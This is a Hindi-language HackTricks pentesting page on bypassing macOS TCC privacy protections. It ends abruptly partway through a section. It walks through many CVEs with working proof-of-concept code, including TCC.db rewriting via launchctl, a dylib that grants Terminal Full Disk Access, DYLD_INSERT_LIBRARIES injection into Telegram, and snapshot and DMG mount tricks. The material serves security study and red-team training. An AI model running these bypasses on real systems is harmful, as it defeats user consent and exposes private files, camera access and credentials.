# macOS TCC बायपास

<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS और HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** पर फॉलो** करें।
* **अपने हैकिंग ट्रिक्स साझा करें, HackTricks** के [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में PRs सबमिट करके।

</details>

## कार्यक्षमता के अनुसार

### लेखन बायपास

यह कोई बायपास नहीं है, यह बस यह दिखाता है कि TCC कैसे काम करता है: **यह लेखन से सुरक्षित नहीं है**। यदि टर्मिनल **किसी उपयोगकर्ता के डेस्कटॉप को पढ़ने का अधिकार नहीं है तो फिर भी उसमें लिख सकता है**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
**विस्तृत विशेषता `com.apple.macl`** नए **फ़ाइल** में जोड़ी जाती है ताकि **निर्माता ऐप** को इसे पढ़ने का अधिकार मिले।

### TCC क्लिकजैकिंग

**TCC प्रॉम्प्ट** पर **एक विंडो रखने** से संभव है ताकि उपयोगकर्ता इसे **ध्यान न देके स्वीकार** कर ले। आप [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)** में एक PoC** देख सकते हैं।

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### अनियमित नाम द्वारा TCC अनुरोध

हमलावर **किसी भी नाम** के ऐप्स (उदाहरण: फाइंडर, गूगल क्रोम...) को **`Info.plist`** में बना सकता है और इसे कुछ TCC सुरक्षित स्थान की अनुमति के लिए अनुरोध करने के लिए बना सकता है। उपयोगकर्ता को लगेगा कि वास्तविक एप्लिकेशन ही इस अनुमति का अनुरोध कर रहा है।

इसके अतिरिक्त, वास्तविक ऐप को डॉक से हटाकर नकली ऐप को वहां रखना संभव है, ताकि जब उपयोगकर्ता नकली ऐप पर क्लिक करता है (जिसमें वही आइकन हो सकता है) तो यह वास्तविक ऐप को बुलाए, TCC अनुमतियाँ मांगे और एक मैलवेयर को क्रियान्वित कर सकता है, जिससे उपयोगकर्ता को यह विश्वास हो कि वास्तविक एप्लिकेशन ने यह अनुमति का अनुरोध किया है।

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

अधिक जानकारी और PoC:

{% content-ref url="../../../macos-privilege-escalation.md" %}
[macos-privilege-escalation.md](../../../macos-privilege-escalation.md)
{% endcontent-ref %}

### SSH बायपास

**SSH के माध्यम से डिफ़ॉल्ट रूप से "फुल डिस्क एक्सेस"** होता था। इसे अक्षम करने के लिए आपको इसे सूचीबद्ध करना होगा लेकिन अक्षम करना होगा (इसे सूची से हटाने से ये अधिकार हट नहीं जाएंगे):

![](<../../../../../.gitbook/assets/image (569).png>)

यहाँ आपको दिखाया गया है कि कैसे कुछ **मैलवेयर्स ने इस सुरक्षा को बायपास** करने में सक्षम रहे हैं:

* [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

{% hint style="danger" %}
ध्यान दें कि अब, SSH को सक्षम करने के लिए आपको **फुल डिस्क एक्सेस** की आवश्यकता है
{% endhint %}

### एक्सटेंशन्स का हैंडल - CVE-2022-26767

फ़ाइलों को **पढ़ने की अनुमति देने के लिए किसी विशेष एप्लिकेशन को** एट्रिब्यूट **`com.apple.macl`** दिया जाता है। यह एट्रिब्यूट सेट किया जाता है जब किसी फ़ाइल को एक एप्लिकेशन पर **ड्रैग एंड ड्रॉप** किया जाता है, या जब एक उपयोगकर्ता एक फ़ाइल को **डबल-क्लिक** करके डिफ़ॉल्ट एप्लिकेशन के साथ खोलता है।

इसलिए, एक उपयोगकर्ता **एक दुरुपयोगी ऐप** को पंजीकृत कर सकता है ताकि वह सभी एक्सटेंशन्स को हैंडल करने के लिए और लॉन्च सेवाओं को कॉल करने के लिए उपयोग कर सके **किसी भी फ़ाइल को खोलें** (ताकि दुरुपयोगी फ़ाइल को पढ़ने की अनुमति मिले)।

### iCloud

एंटाइटलमेंट **`com.apple.private.icloud-account-access`** के माध्यम से **`com.apple.iCloudHelper`** XPC सेवा के साथ संवाद करना संभव है जो **iCloud टोकन प्रदान** करेगा।

**iMovie** और **Garageband** में इस एंटाइटलमेंट और अन्य जो अनुमतियाँ थीं।

इस एंटाइटलमेंट से iCloud टोकन प्राप्त करने के लिए उस एक्सप्लॉइट के बारे में अधिक **जानकारी** के लिए टॉक देखें: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)

### kTCCServiceAppleEvents / Automation

एक एप्लिकेशन जिसमें **`kTCCServiceAppleEvents`** अनुमति है, वह **अन्य ऐप्स को नियंत्रित** कर सकता है। इसका मतलब है कि यह अन्य ऐप्स को दी गई अनुमतियों का दुरुपयोग कर सकता है।

एप्पल स्क्रिप्ट्स के बारे में अधिक जानकारी के लिए देखें:

{% content-ref url="macos-apple-scripts.md" %}
[macos-apple-scripts.md](macos-apple-scripts.md)
{% endcontent-ref %}

उदाहरण के लिए, यदि किसी ऐप के पास **`iTerm`** पर **Automation अनुमति** है, उदाहरण के लिए इस उदाहरण में **`Terminal`** के पास iTerm पर पहुंच है:

<figure><img src="../../../../../.gitbook/assets/image (2) (2) (1).png" alt=""><figcaption></figcaption></figure>

#### iTerm के ऊपर

जिसके पास FDA नहीं है, वह Terminal, iTerm को कॉल कर सकता है, जिसके पास यह है, और इसे क्रियाएँ करने के लिए उपयोग कर सकता है:

{% code title="iterm.script" %}
```applescript
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```
{% endcode %}
```bash
osascript iterm.script
```
#### Finder के ऊपर

या अगर किसी एप्लिकेशन को Finder के ऊपर एक्सेस है, तो यह एक स्क्रिप्ट हो सकती है जैसे यह है:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## ऐप व्यवहार द्वारा

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

उपयोगकर्ता भूमि **tccd डेमन** जो **`HOME`** **env** चर का उपयोग कर रहा है ताकि TCC उपयोगकर्ता डेटाबेस तक पहुंच सके: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

[इस Stack Exchange पोस्ट](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) के अनुसार और क्योंकि TCC डेमन वर्तमान उपयोगकर्ता डोमेन के अंदर `launchd` के माध्यम से चल रहा है, इसे **नियंत्रित करना संभव है** सभी पर्यावरण चर जो इसे पारित किए जाते हैं।\
इसलिए, एक **हमलावर** यह कर सकता है कि **`launchctl`** में `$HOME` पर्यावरण चर को एक **नियंत्रित निर्देशिका** की ओर इशारा करने के लिए सेट करें, **TCC** डेमन को **पुनः आरंभ** करें, और फिर **सीधे TCC डेटाबेस को संशोधित** करें ताकि यह अंत उपयोगकर्ता को कभी पूछे बिना **हर TCC अधिकार** उपलब्ध करा सके।\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - नोट्स

नोट्स को TCC सुरक्षित स्थानों तक पहुंच था, लेकिन जब एक नोट बनाया जाता है तो यह **एक सुरक्षित स्थान में नहीं बनाया जाता है**। इसलिए, आप नोट्स से कह सकते थे कि एक सुरक्षित फ़ाइल को एक नोट में कॉपी करें (इसलिए एक सुरक्षित स्थान में) और फिर फ़ाइल तक पहुंचें:

<figure><img src="../../../../../.gitbook/assets/image (6) (1) (3).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - स्थानांतरण

बाइनरी `/usr/libexec/lsd` जिसमें पुस्तकालय `libsecurity_translocate` थी, उसमें entitlement `com.apple.private.nullfs_allow` था जिसने इसे **nullfs** माउंट बनाने की अनुमति दी और entitlement `com.apple.private.tcc.allow` था जिसमें **`kTCCServiceSystemPolicyAllFiles`** के साथ प्रत्येक फ़ाइल तक पहुंचने की अनुमति थी।

"पुस्तकालय" में quarantine विशेषता जोड़ना संभव था, **`com.apple.security.translocation`** XPC सेवा को कॉल करना था और फिर यह पुस्तकालय को **`$TMPDIR/AppTranslocation/d/d/Library`** मैप कर देता था जहाँ पुस्तकालय के सभी दस्तावेज़ तक पहुंच सकते थे।

### CVE-2023-38571 - संगीत और टीवी <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>

**`संगीत`** में एक दिलचस्प सुविधा थी: जब यह चल रहा होता था, तो यह **`~/Music/Music/Media.localized/Automatically Add to Music.localized`** में ड्रॉप की गई फ़ाइलों को उपयोगकर्ता के "मीडिया पुस्तकालय" में **आयात** कर लेता था। इसके अतिरिक्त, यह कुछ इस प्रकार को कॉल करता था: **`rename(a, b);`** जहाँ `a` और `b` थे:

* `a = "~/Music/Music/Media.localized/Automatically Add to Music.localized/myfile.mp3"`
* `b = "~/Music/Music/Media.localized/Automatically Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3`

यह **`rename(a, b);`** व्यवहार एक **रेस कंडीशन** के लिए सुरक्षित नहीं था, क्योंकि संभव था कि "Automatically Add to Music.localized" फ़ोल्डर में एक नकली **TCC.db** फ़ाइल डाली जा सकती थी और फिर जब नया फ़ोल्डर (b) बनाया जाता था तो फ़ाइल को कॉपी, हटा दिया जाता था, और इसे **`~/Library/Application Support/com.apple.TCC`**/ की ओर पॉइंट किया जाता था।

### SQLITE\_SQLLOG\_DIR - CVE-2023-32422

अगर **`SQLITE_SQLLOG_DIR="path/folder"`** बस यह मतलब है कि **किसी भी खुली db को उस पथ में कॉपी किया जाता है**। इस CVE में इस नियंत्रण का दुरुपयोग किया गया था ताकि एक प्रक्रिया द्वारा खोली जाने वाली SQLite डेटाबेस के अंदर **लिखा** जा सके, और फिर **`SQLITE_SQLLOG_DIR`** का दुरुपयोग करके **फ़ाइल नाम में सिमलिंक** किया जा सके ताकि जब वह डेटाबेस **खोला जाता है**, तो उपयोगकर्ता का **TCC.db ओवरराइट** हो जाता है।\
**अधिक जानकारी** [**लेख में**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html) **और**[ **टॉक में**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y\&t=20548s)।

### **SQLITE\_AUTO\_TRACE**

यदि पर्यावरण चर **`SQLITE_AUTO_TRACE`** सेट किया गया है, तो पुस्तकालय **`libsqlite3.dylib`** सभी SQL क्वेरी को लॉग करना शुरू कर देगी। कई एप्लिकेशन इस पुस्तकालय का उपयोग करते थे, इसलिए उनकी सभी SQLite क्वेरी को लॉग करना संभव था।

कई Apple एप्लिकेशन ने TCC सुरक्षित जानकारी तक पहुंचने के लिए इस पुस्तकालय का उपयोग किया।
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### MTL_DUMP_PIPELINES_TO_JSON_FILE - CVE-2023-32407

यह **एनवी वेरिएबल `Metal` फ्रेमवर्क द्वारा उपयोग किया जाता है** जो विभिन्न कार्यक्रमों की आवश्यकता है, जिसमें सबसे महत्वपूर्ण रूप से `Music` शामिल है, जिसमें FDA है।

निम्नलिखित सेट करना: `MTL_DUMP_PIPELINES_TO_JSON_FILE="पथ/नाम"`। यदि `पथ` एक मान्य निर्देशिका है, तो बग ट्रिगर होगा और हम `fs_usage` का उपयोग करके कार्यक्रम में क्या हो रहा है देख सकते हैं:

* एक फ़ाइल `open()` होगी, जिसे `पथ/.dat.nosyncXXXX.XXXXXX` (X यादृच्छिक है) कहा जाएगा
* एक या एक से अधिक `write()` फ़ाइल में सामग्री लिखेंगे (हम इसे नियंत्रित नहीं करते)
* `पथ/.dat.nosyncXXXX.XXXXXX` को `rename()` किया जाएगा `पथ/नाम`

यह एक अस्थायी फ़ाइल लेखन है, जिसे एक **`rename(old, new)`** **जो सुरक्षित नहीं है।**

यह सुरक्षित नहीं है क्योंकि इसे **पुराने और नए पथ को अलग-अलग समाधान करना होता है**, जो कुछ समय लगा सकता है और एक रेस स्थिति के लिए विकल्प हो सकता है। अधिक जानकारी के लिए आप `xnu` फ़ंक्शन `renameat_internal()` की जांच कर सकते हैं।

{% hint style="danger" %}
इसलिए, मौजूदा फ़ोल्डर से रीनेम कर रहे एक विशेषाधिकारित प्रक्रिया के लिए, आप एक RCE जीत सकते हैं और इसे एक विभिन्न फ़ाइल तक पहुंचा सकते हैं या, जैसे कि इस CVE में, विशेषाधिकृत ऐप द्वारा बनाई गई फ़ाइल खोल सकते हैं और FD स्टोर कर सकते हैं।

यदि रीनेम आपके नियंत्रण वाले फ़ोल्डर से गुजरता है, जब आपने स्रोत फ़ाइल को संशोधित किया हो या उसके लिए एक FD हो, तो आप गंतव्य फ़ाइल (या फ़ोल्डर) को एक सिमलिंक करने के लिए बदल सकते हैं, ताकि आप जब चाहें लिख सकें।
{% endhint %}

यह CVE में हमला था: उदाहरण के लिए, उपयोगकर्ता के `TCC.db` को ओवरराइट करने के लिए हम सकते हैं:

* `/Users/hacker/ourlink` बनाएं जो `/Users/hacker/Library/Application Support/com.apple.TCC/` को इंगित करता है
* निर्देशिका `/Users/hacker/tmp/` बनाएं
* `MTL_DUMP_PIPELINES_TO_JSON_FILE=/Users/hacker/tmp/TCC.db` सेट करें
* इस env var के साथ `Music` चलाकर बग को ट्रिगर करें
* `/Users/hacker/tmp/.dat.nosyncXXXX.XXXXXX` का `open()` को लें (X यादृच्छिक है)
* यहाँ हम इस फ़ाइल को लिखने के लिए भी `open()` करें, और फ़ाइल डिस्क्रिप्टर को पकड़ें
* `/Users/hacker/tmp` को `/Users/hacker/ourlink` में एटॉमिकली स्विच करें **एक लूप में**
* हम इसे अधिक संभावना है कि हमारे सफल होने की अवधि काफी संकुचित है, लेकिन रेस हारने का नुकसान अनदेखा है
* थोड़ी देर प्रतीक्षा करें
* यदि नहीं, फिर से ऊपर से चलाएं

अधिक जानकारी के लिए [https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html](https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html)

{% hint style="danger" %}
अब, यदि आप एनवी वेरिएबल `MTL_DUMP_PIPELINES_TO_JSON_FILE` का उपयोग करने का प्रयास करेंगे तो ऐप्स नहीं लॉन्च होंगे
{% endhint %}

### Apple Remote Desktop

रूट के रूप में आप इस सेवा को सक्षम कर सकते हैं और **ARD एजेंट को पूरी डिस्क एक्सेस** होगा जिसे फिर उपयोगकर्ता द्वारा दुरुपयोग किया जा सकता है ताकि वह एक नया **TCC उपयोगकर्ता डेटाबेस** कॉपी कर सके।

## **NFSHomeDirectory** द्वारा

TCC उपयोगकर्ता की होम फ़ोल्डर में एक डेटाबेस का उपयोग करता है जो उपयोगकर्ता के लिए विशेष संसाधनों तक पहुंच को नियंत्रित करने के लिए है **$HOME/Library/Application Support/com.apple.TCC/TCC.db**।\
इसलिए, यदि उपयोगकर्ता TCC को एक **विभिन्न फ़ोल्डर** की ओर पुनरारंभ करने में सफल होता है, तो उपयोगकर्ता **/Library/Application Support/com.apple.TCC/TCC.db** में एक नया TCC डेटाबेस बना सकता है और TCC को किसी भी ऐप को किसी भी TCC अनुमति को प्रदान करने के लिए धोखा दे सकता है।

{% hint style="success" %}
ध्यान दें कि Apple उपयोगकर्ता के प्रोफ़ाइल में संग्रहित सेटिंग का उपयोग करता है **`NFSHomeDirectory`** विशेषता के लिए **`$HOME`** के मान के लिए, इसलिए यदि आप इस मान को संशोधित करने की अनुमति वाले एप्लिकेशन को कंप्रमाइज करते हैं (**`kTCCServiceSystemPolicySysAdminFiles`**), तो आप इस विकल्प को एक TCC बायपास के साथ **हथियाना** कर सकते हैं।
{% endhint %}

### [CVE-2020–9934 - TCC](./#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](./#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**पहला POC** [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) और [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) का उपयोग करता है उपयोगकर्ता के होम फ़ोल्डर को संशोधित करने के लिए।

1. लक्षित ऐप के लिए _csreq_ ब्लॉब प्राप्त करें।
2. आवश्यक पहुंच और _csreq_ ब्लॉब के साथ एक नकली _TCC.db_ फ़ाइल रखें।
3. [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) के साथ उपयोगकर्ता के डायरेक्टरी सेवाओं की एंट्री निर्यात करें।
4. उपयोगकर्ता के होम डायरेक्टरी को बदलने के लिए डायरेक्टरी सेवाओं की एंट्री में संशोधन करें।
5. [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) के साथ संशोधित डायरेक्टरी सेवाओं की एंट्री आयात करें।
6. उपयोगकर्ता के _tccd_ को बंद करें और प्रक्रिया पुनः आरंभ करें।

दूसरा POC **`/usr/libexec/configd`** का उपयोग करता था जिसमें `com.apple.private.tcc.allow` था जिसमें मान `kTCCServiceSystemPolicySysAdminFiles` था।\
यदि एक हमलावर **`configd`** को **`-t`** विकल्प के साथ चलाता है, तो एक आक्रमक व्यक्ति एक **कस्टम बंडल को लोड** कर सकता था। इसलिए, उत्पाद **`dsexport`** और **`dsimport`** के तरीके को बदलने के लिए **`configd` कोड इंजेक्शन** के साथ एक उत्पाद को बदलता है।

अधिक जानकारी के लिए [**मूल रिपोर्ट**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/) देखें।

## प्रक्रिया इंजेक्शन द्वारा

प्रक्रिया में कोड डालने और इसके TCC विशेषाधिकारों का दुरुपयोग करने के लिए विभिन्न तकनीक हैं:

{% content-ref url="../../../macos-proces-abuse/" %}
[macos-proces-abuse](../../../macos-proces-abuse/)
{% endcontent-ref %}

इसके अतिरिक्त, TCC को बायपास करने के लिए सबसे सामान्य प्रक्रिया इंजेक्शन विषयक अद्यायन के माध्यम से होता है **प्लगइन्स (लोड पुस्तकालय)** के माध्यम से।\
### CVE-2020-29621 - Coreaudiod

बाइनरी **`/usr/sbin/coreaudiod`** के entitlements `com.apple.security.cs.disable-library-validation` और `com.apple.private.tcc.manager` थे। पहला **कोड इंजेक्शन की अनुमति देना** और दूसरा इसे **TCC को प्रबंधित करने की अनुमति देना**।

यह बाइनरी `/Library/Audio/Plug-Ins/HAL` फ़ोल्डर से **तीसरे पक्ष के प्लग-इन्स** लोड करने की अनुमति देता था। इसलिए, इस PoC के साथ **एक प्लगइन लोड करना और TCC अनुमतियों का दुरुपयोग करना** संभव था:
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
अधिक जानकारी के लिए [**मूल रिपोर्ट**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/) देखें।

### डिवाइस अबस्ट्रैक्शन लेयर (DAL) प्लग-इन्स

कोर मीडिया I/O के माध्यम से कैमरा स्ट्रीम खोलने वाले सिस्टम एप्लिकेशन (ऐप्स जिनमें **`kTCCServiceCamera`** है) **प्रक्रिया में इन प्लग-इन्स** को लोड करते हैं जो `/Library/CoreMediaIO/Plug-Ins/DAL` में स्थित हैं (SIP सीमित नहीं है)।

वहाँ एक लाइब्रेरी स्टोर करना जिसमें सामान्य **कंस्ट्रक्टर** है, **कोड इंजेक्शन** के लिए काम करेगा।

कई Apple एप्लिकेशन इसके लिए संक्षेपित थे।

### Firefox

Firefox एप्लिकेशन में `com.apple.security.cs.disable-library-validation` और `com.apple.security.cs.allow-dyld-environment-variables` एंटाइटलमेंट्स थे:
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
### CVE-2020-10006

बाइनरी `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` में **`com.apple.private.tcc.allow`** और **`com.apple.security.get-task-allow`** entitlements थे, जिससे प्रक्रिया में कोड इंजेक्ट करने और TCC विशेषाधिकारों का उपयोग करने की अनुमति थी।

### CVE-2023-26818 - Telegram

Telegram में **`com.apple.security.cs.allow-dyld-environment-variables`** और **`com.apple.security.cs.disable-library-validation`** entitlements थे, इसलिए इसका दुरुपयोग करके **उसकी अनुमतियों तक पहुंचना** संभव था जैसे कैमरे के साथ रिकॉर्डिंग। आप [**व्रिटअप में पेलोड देख सकते हैं**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)।

ध्यान दें कि एक **कस्टम प्लिस्ट** इस लाइब्रेरी को इंजेक्ट करने के लिए बनाया गया था और **`launchctl`** का उपयोग इसे लॉन्च करने के लिए किया गया था:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## खुले आमंत्रण के द्वारा

सैंडबॉक्स के बीच **`open`** को आमंत्रित करना संभव है

### टर्मिनल स्क्रिप्ट्स

टेक लोगों द्वारा उपयोग किए जाने वाले कंप्यूटर में टर्मिनल को **पूर्ण डिस्क एक्सेस (FDA)** देना काफी सामान्य है। और इसका उपयोग **`.terminal`** स्क्रिप्ट्स को इसके साथ उपयोग करना संभव है।

**`.terminal`** स्क्रिप्ट्स ऐसे plist फ़ाइलें हैं जिसमें **`CommandString`** कुंजी में निष्पादित करने के लिए आदेश होता है:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
एक एप्लिकेशन एक टर्मिनल स्क्रिप्ट को /tmp जैसी स्थान पर लिख सकता है और इसे इस प्रकार लॉन्च कर सकता है:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## द्वारा माउंटिंग

### CVE-2020-9771 - mount\_apfs TCC बायपास और प्रिविलेज उन्नयन

**कोई भी उपयोगकर्ता** (यहाँ तक कि अन-प्रिविलेज्ड भी) एक टाइम मशीन स्नैपशॉट बना सकता है और माउंट कर सकता है और **उस स्नैपशॉट के सभी फ़ाइलों तक पहुँच सकता है**।\
**केवल प्रिविलेज्ड** जो चाहिए है वह एप्लिकेशन के लिए है (जैसे `Terminal`) को **पूर्ण डिस्क एक्सेस** (FDA) एक्सेस (`kTCCServiceSystemPolicyAllfiles`) होना चाहिए जिसे एक एडमिन द्वारा दिया जाना चाहिए।

{% code overflow="wrap" %}
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
{% endcode %}

एक और विस्तृत व्याख्या [**मूल रिपोर्ट में पाई जा सकती है**](https://theevilbit.github.io/posts/cve\_2020\_9771/)**.**

### CVE-2021-1784 और CVE-2021-30808 - TCC फ़ाइल पर माउंट करें

यद्यपि TCC DB फ़ाइल सुरक्षित है, एक नई TCC.db फ़ाइल को **डायरेक्टरी पर माउंट करना** संभव था:
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```
{% endcode %}
```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
जांचें **पूर्ण उत्पीड़न** [**मूल लेख**](https://theevilbit.github.io/posts/cve-2021-30808/).

### asr

उपकरण **`/usr/sbin/asr`** को पूरे डिस्क की कॉपी करने और उसे दूसरी जगह माउंट करने की अनुमति देता था, जिससे TCC सुरक्षा को छलना संभव था।

### स्थान सेवाएं

